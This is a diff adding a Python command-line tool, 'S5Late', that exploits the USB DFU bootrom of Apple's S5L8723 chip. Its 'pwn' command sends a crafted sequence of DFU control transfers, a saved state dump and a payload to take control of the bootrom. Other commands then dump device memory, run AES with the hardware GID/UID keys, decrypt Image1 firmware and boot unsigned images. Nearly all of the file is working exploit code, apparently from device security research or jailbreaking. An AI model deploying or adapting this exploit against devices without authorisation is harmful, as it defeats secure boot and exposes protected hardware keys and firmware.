@@ -1,0 +1,565 @@
+#!/usr/bin/env python3
+
+import time
+import struct
+import argparse
+from dataclasses import dataclass
+from contextlib import suppress
+from enum import Enum
+
+import usb
+
+APPLE_VID = 0x5AC
+S5L8723_USBDFU_PID = 0x1232
+
+DNLD_MAX_PACKET_SIZE = 0x800
+UPLD_MAX_PACKET_SIZE = 0x40
+
+USB_TIMEOUT = 1000
+EXPECTED_USB_NAME = "S5L8723 pwnDFU"
+
+COMMAND_RESET  = 0x72657374   # 'rest'
+COMMAND_DUMP   = 0x64756D70   # 'dump'
+COMMAND_AESDEC = 0x61657364   # 'aesd'
+COMMAND_AESENC = 0x61657365   # 'aese'
+
+AES_BLOCK_SIZE = 16
+AES_KEY_GID = 1
+AES_KEY_UID = 2
+
+class USBDFUError(Enum):
+    errOk          = 0x00
+    errTarget      = 0x01
+    errFile        = 0x02
+    errWrite       = 0x03
+    errErase       = 0x04
+    errCheckErased = 0x05
+    errProg        = 0x06
+    errVerify      = 0x07
+    errAddress     = 0x08
+    errNotDone     = 0x09
+    errFirmware    = 0x0a
+    errVendor      = 0x0b
+    errUsbr        = 0x0c
+    errPor         = 0x0d
+    errUnknown     = 0x0e
+    errStalledPkt  = 0x0f
+
+class USBDFUStatus(Enum):
+    appIdle              = 0
+    appDetach            = 1
+    dfuIdle              = 2
+    dfuDnloadSync        = 3
+    dfuDnBusy            = 4
+    dfuDnloadIdle        = 5
+    dfuManifestSync      = 6
+    dfuManifest          = 7
+    dfuManifestWaitReset = 8
+    dfuUploadIdle        = 9
+    dfuError             = 10
+
+@dataclass
+class USBDFUState:
+    error: int
+    timeout: int
+    status: int
+
+    @classmethod
+    def from_raw(cls, raw: bytes):
+        error = raw[0]
+        timeout = (raw[3] << 16) | (raw[2] << 8) | raw[1]
+        state = raw[4]
+        return cls(error, timeout, state)
+
+class USBDFUDeviceError(Exception):
+    pass
+
+class USBDFUDevice:
+    def __init__(self, pid: int, vid: int = APPLE_VID):
+        self.pid = pid
+        self.vid = vid
+
+        self.dev = None
+        self._open = False
+
+    def open(self, attempts: int = 5):
+        for _ in range(attempts):
+            try:
+                self.dev = usb.core.find(idProduct=self.pid, idVendor=self.vid)
+                assert self.dev
+                self._open = True
+                break
+            except Exception:
+                time.sleep(0.25)
+
+        if not self._open:
+            raise USBDFUDeviceError("cannot open USB device - is it even connected?")
+        
+        self.dev.set_configuration(1)
+        self.dev.set_interface_altsetting(0, 0)
+
+    def close(self):
+        usb.util.dispose_resources(self.dev)
+
+    def usb_reset(self):
+        with suppress(usb.core.USBError):
+            self.dev.reset()
+
+    def dnload(self, data: bytes, block_num: int = 0):
+        self.dev.ctrl_transfer(0x21, 1, block_num, 0, data, USB_TIMEOUT)
+        
+    def upload(self, amount: int = UPLD_MAX_PACKET_SIZE) -> bytes:
+        result = self.dev.ctrl_transfer(0xA1, 2, 0, 0, amount, USB_TIMEOUT)
+        assert len(result) == amount
+        return result
+
+    def getstate(self) -> USBDFUState:
+        result = self.dev.ctrl_transfer(0xA1, 3, 0, 0, 6, USB_TIMEOUT)
+        assert len(result) == 6
+        return USBDFUState.from_raw(result)
+    
+    def getstatus(self) -> int:
+        result = self.dev.ctrl_transfer(0xA1, 5, 0, 0, 1, USB_TIMEOUT)
+        return result[0]
+    
+    def clrstatus(self):
+        self.dev.ctrl_transfer(0x21, 4, 0, 0, None, USB_TIMEOUT)
+
+    def abort(self):
+        self.dev.ctrl_transfer(0x21, 6, 0, 0, None, USB_TIMEOUT)
+
+    def send_data(self, data: bytes) -> int:
+        index = 0
+        packets = 0
+        while index < len(data):
+            amount = min(len(data) - index, DNLD_MAX_PACKET_SIZE)
+            
+            self.dnload(data[index : index + amount], packets)
+
+            while True:
+                state = self.getstate()
+
+                if state.error != USBDFUError.errOk.value:
+                    raise ValueError("wow, we have a DFU error on download - 0x%x" % state.error)
+                
+                if state.status == USBDFUStatus.dfuDnloadIdle.value:
+                    break
+
+                if state.timeout:
+                    time.sleep(state.timeout / 1000)
+
+            packets += 1
+            index += amount
+        
+        return packets
+
+    def request_image_validation(self, packets: int):
+        assert self.dev.ctrl_transfer(0x21, 1, packets + 1, 0, "", USB_TIMEOUT) == 0
+        try:
+            for _ in range(3):
+                self.dev.ctrl_transfer(0xA1, 3, 0, 0, 6, USB_TIMEOUT)
+        except usb.core.USBError:
+            pass
+        
+        self.usb_reset()
+
+    def name(self):
+        return usb.util.get_string(self.dev, 2, 0)
+
+    def __del__(self):
+        if self._open:
+            self.close()
+            self._open = False
+
+class Image1:
+    DATA_START_MAP = {
+        "8900" : 0x800,
+        "8442" : 0x800,
+        "8723" : 0x400
+    }
+
+    def __init__(self, buffer: bytes):
+        self.magic = buffer[:4].decode("ascii")
+        self.version = buffer[4:7].decode("ascii")
+        self.type = struct.unpack("<B", buffer[7:8])[0]
+
+        self.dataoff = self.DATA_START_MAP[self.magic]
+
+        (self.entrypoint, self.bodylen, self.datalen, self.certoff, self.certlen) = struct.unpack("<5I", buffer[8:28])
+
+    def __repr__(self) -> str:
+        return "Image1 v%s (%s): type: 0x%x entry: 0x%x bodylen: 0x%x datalen: 0x%x certoff: 0x%x certlen: 0x%x" % \
+            (
+                self.version,
+                self.magic,
+                self.type,
+                self.entrypoint,
+                self.bodylen,
+                self.datalen,
+                self.certoff,
+                self.certlen
+            )
+
+def device_open() -> USBDFUDevice:
+    dev = USBDFUDevice(S5L8723_USBDFU_PID)
+    dev.open()
+
+    name = dev.name()
+
+    if name != EXPECTED_USB_NAME:
+        print("unexpected USB device name, did you run the exploit?")
+        exit(-1)
+
+    dev.clrstatus()
+    dev.abort()
+
+    return dev
+
+def cmd_encode(command: int, *args) -> bytes:
+    buf = struct.pack("<I", command)
+    for arg in args:
+        buf += struct.pack("<I", arg)
+
+    return buf
+
+def cmd_send(dev: USBDFUDevice, cmd: bytes, length: int = UPLD_MAX_PACKET_SIZE) -> bytes:
+    dev.send_data(cmd)
+
+    dev.dnload(None, 1)
+    status = dev.getstatus()
+    assert status == USBDFUStatus.dfuManifestSync.value
+
+    dev.clrstatus()
+    ret = dev.upload(length)
+    dev.clrstatus()
+
+    status = dev.getstatus()
+    assert status == USBDFUStatus.dfuIdle.value
+
+    return ret
+
+def aes_op(device: USBDFUDevice, cmd: int, key: int, buffer: bytes, iv: bytes = None, callback: callable = None) -> bytes:
+    start = time.perf_counter()
+    
+    total_len = len(buffer)
+
+    if total_len % AES_BLOCK_SIZE:
+        raise ValueError("AES operations require 16-byte aligned input")
+
+    index = 0
+    
+    ret = bytes()
+
+    while True:
+        op = "decrypting" if cmd == COMMAND_AESDEC else "encrypting"
+        print("\r%s: %d%%" % (op, int(index / total_len * 100)), end="")
+
+        if index >= total_len:
+            break
+
+        amount = min(total_len - index, UPLD_MAX_PACKET_SIZE - AES_BLOCK_SIZE)
+        real_amount = amount
+        iv_hack = index != 0 or iv is not None
+
+        if iv_hack:
+            real_amount += AES_BLOCK_SIZE
+
+        cmd_ser = cmd_encode(cmd, real_amount, key, int(iv_hack))
+
+        if iv_hack:
+            cmd_ser += iv
+
+        data = buffer[index : index + amount]
+        cmd_ser += data
+
+        tmp = cmd_send(device, cmd_ser, amount)
+
+        if cmd == COMMAND_AESDEC:
+            iv = data[-AES_BLOCK_SIZE:]
+        else:
+            iv = tmp[-AES_BLOCK_SIZE:]
+
+        if callback:
+            callback(tmp, index, amount)
+
+        ret += tmp
+        index += amount
+
+    print()
+
+    end = time.perf_counter()
+
+    print(
+        "succesfully %s %d bytes in %.3f seconds (%.3f bytes/sec)" % (
+            "decrypted" if cmd == COMMAND_AESDEC else "encrypted",
+            total_len,
+            end - start,
+            total_len / (end - start)
+        )
+    )
+
+    return ret
+
+def do_pwn(args):
+    STATE_LEN    = 0x640
+    STAGE0_LEN   = 0x780
+    STAGE1_LEN   = 0x100
+    OVERRIDE_LEN = 0x24C0
+    PORTION      = 0x40
+
+    with open("n6g_dfu_state.dump", "rb") as f:
+        state = f.read()
+
+    assert len(state) == STATE_LEN
+
+    with open("payload.bin", "rb") as f:
+        payload = f.read()
+    
+    payload += b"\xff" * (OVERRIDE_LEN - STAGE0_LEN - STAGE1_LEN - len(state) - len(payload))
+
+    dev = USBDFUDevice(S5L8723_USBDFU_PID)
+    dev.open()
+
+    if dev.name() == EXPECTED_USB_NAME:
+        print("device is already pwned")
+        exit(0)
+
+    dev.clrstatus()
+    dev.abort()
+
+    dev.dev.ctrl_transfer(0x21, 1, 0, 0, b"\xff" * STAGE0_LEN, USB_TIMEOUT)
+    dev.dev.ctrl_transfer(0xA1, 3, 0, 0, 6, USB_TIMEOUT)
+
+    dev.dev.ctrl_transfer(0x21, 1, 1, 0, b"\xff" * STAGE1_LEN, USB_TIMEOUT)
+    dev.dev.ctrl_transfer(0xA1, 3, 0, 0, 6, USB_TIMEOUT)
+
+    for i in range(0, len(state), PORTION):
+        dev.dev.ctrl_transfer(0x21, 1, 1, 0, state[i : i + PORTION], USB_TIMEOUT)
+        dev.dev.ctrl_transfer(0xA1, 3, 0, 0, 6, USB_TIMEOUT)
+
+    for z in range(0, len(payload), PORTION):
+        dev.dev.ctrl_transfer(0x21, 1, 1, 0, payload[z : z + PORTION], USB_TIMEOUT)
+        dev.dev.ctrl_transfer(0xA1, 3, 0, 0, 6, USB_TIMEOUT)
+
+    dev.dev.ctrl_transfer(0x21, 1, 1, 0, b"\x00" * 0x30, USB_TIMEOUT)
+    dev.dev.ctrl_transfer(0xA1, 3, 0, 0, 6, USB_TIMEOUT)
+
+    last = struct.pack(
+        "<4I",
+        0xC2F3E9B2,
+        0x0,
+        0x2202E380,
+        0x2202D900
+    )
+
+    dev.dev.ctrl_transfer(0x21, 1, 1, 0, last, USB_TIMEOUT)
+    dev.dev.ctrl_transfer(0xA1, 3, 0, 0, 6, USB_TIMEOUT)
+
+    dev.clrstatus()
+
+    with suppress(usb.core.USBError):
+        dev.upload()
+
+    dev.close()
+
+    time.sleep(0.5)
+
+    dev = USBDFUDevice(S5L8723_USBDFU_PID)
+    dev.open()
+
+    name = dev.name()
+
+    if name != EXPECTED_USB_NAME:
+        print("unexpected USB device name after sending exploit - %s" % name)
+        exit(-1)
+
+    dev.abort()
+
+    status = dev.getstatus()
+    if status != USBDFUStatus.dfuIdle.value:
+        raise ValueError("unexpected status after DFU abort - 0x%x" % status)
+
+    dev.close()
+
+def do_dump(args):
+    dev = device_open()
+
+    f = open(args.file, "wb")
+
+    start = time.perf_counter()
+
+    index = 0
+    while True:
+        print("\rdumping: %d%%" % int(index / args.length * 100), end="")
+
+        if index >= args.length:
+            break
+        
+        amount = min(args.length - index, UPLD_MAX_PACKET_SIZE)
+
+        f.write(
+            cmd_send(
+                dev,
+                cmd_encode(
+                    COMMAND_DUMP,
+                    args.address + index,
+                    amount
+                ),
+                amount
+            )
+        )
+
+        index += amount
+
+    print()
+
+    f.close()
+    dev.close()
+
+    end = time.perf_counter()
+
+    print(
+        "succesfully dumped %d bytes in %.3f seconds (%.3f bytes/sec)" % (
+            args.length,
+            end - start,
+            args.length / (end - start)
+        )
+    )
+
+def do_aes(args):
+    dev = device_open()
+
+    if args.op == "dec":
+        cmd = COMMAND_AESDEC
+    elif args.op == "enc":
+        cmd = COMMAND_AESENC
+    else:
+        print("unknown operation - %s" % args.op)
+        exit(-1)
+
+    if args.key == "GID":
+        key = AES_KEY_GID
+    elif args.key == "UID":
+        key = AES_KEY_UID
+    else:
+        print("unknown key - %s" % args.key)
+        exit(-1)
+
+    with open(args.input, "rb") as f:
+        in_buf = f.read()
+
+    with open(args.output, "wb") as f:
+        f.write(aes_op(dev, cmd, key, in_buf))
+
+    dev.close()
+
+def do_image1(args):
+    dev = device_open()
+
+    with open(args.input, "rb") as f:
+        in_buf = f.read()
+
+    image1 = Image1(in_buf)
+
+    print(image1)
+
+    real_len = image1.bodylen
+    padded_len = real_len
+
+    if real_len % AES_BLOCK_SIZE:
+        padded_len += AES_BLOCK_SIZE - (real_len % AES_BLOCK_SIZE)
+    
+    f = open(args.output, "wb")
+
+    def write_cb(buf: bytes, index: int, length: int):
+        curr_len = index + length
+        if curr_len > real_len:
+            truncated_len = length - (curr_len - real_len)
+            f.write(buf[:truncated_len])
+        else:
+            f.write(buf)
+
+    aes_op(
+        dev,
+        COMMAND_AESDEC,
+        AES_KEY_GID,
+        in_buf[image1.dataoff : image1.dataoff + padded_len],
+        callback=write_cb
+    )
+
+    dev.close()
+
+def do_reboot(args):
+    dev = device_open()
+
+    try:
+        cmd_send(dev, cmd_encode(COMMAND_RESET))
+    except Exception:
+        pass
+
+    dev.usb_reset()
+    dev.close()
+
+def do_boot(args):
+    dev = device_open()
+
+    with open(args.file, "rb") as f:
+        in_buf = f.read()
+
+    dev.clrstatus()
+    dev.send_data(in_buf)
+    dev.clrstatus()
+
+    try:
+        dev.upload()
+    except Exception:
+        pass
+
+    dev.close()
+
+def hexint(str) -> int:
+    return int(str, 16)
+
+def main():
+    parser = argparse.ArgumentParser(description="S5Late (S5L8723)")
+    subparsers = parser.add_subparsers()
+
+    pwn_parse = subparsers.add_parser("pwn", help="run the exploit to enter pwnDFU mode")
+    pwn_parse.set_defaults(func=do_pwn)
+
+    dump_parse = subparsers.add_parser("dump", help="dump some memory")
+    dump_parse.set_defaults(func=do_dump)
+    dump_parse.add_argument("file", help="file path to save to")
+    dump_parse.add_argument("address", type=hexint)
+    dump_parse.add_argument("length", type=hexint)
+
+    aes_parse = subparsers.add_parser("aes", help="decrypt/encrypt with GID/UID key")
+    aes_parse.set_defaults(func=do_aes)
+    aes_parse.add_argument("op", help="operation - dec/enc")
+    aes_parse.add_argument("key", help="key - GID/UID")
+    aes_parse.add_argument("input", help="input file")
+    aes_parse.add_argument("output", help="output file")
+
+    image1_parse = subparsers.add_parser("image1", help="decrypt Image1")
+    image1_parse.set_defaults(func=do_image1)
+    image1_parse.add_argument("input", help="input file")
+    image1_parse.add_argument("output", help="output file")
+
+    boot_parse = subparsers.add_parser("boot", help="boot WTF from file")
+    boot_parse.set_defaults(func=do_boot)
+    boot_parse.add_argument("file", help="raw WTF to boot")
+
+    reboot_parse = subparsers.add_parser("reboot", help="reboot device")
+    reboot_parse.set_defaults(func=do_reboot)
+
+    args = parser.parse_args()
+    if not hasattr(args, "func"):
+        parser.print_help()
+        exit(-1)
+
+    args.func(args)
+
+    print("DONE")
+
+if __name__ == "__main__":
+    main()
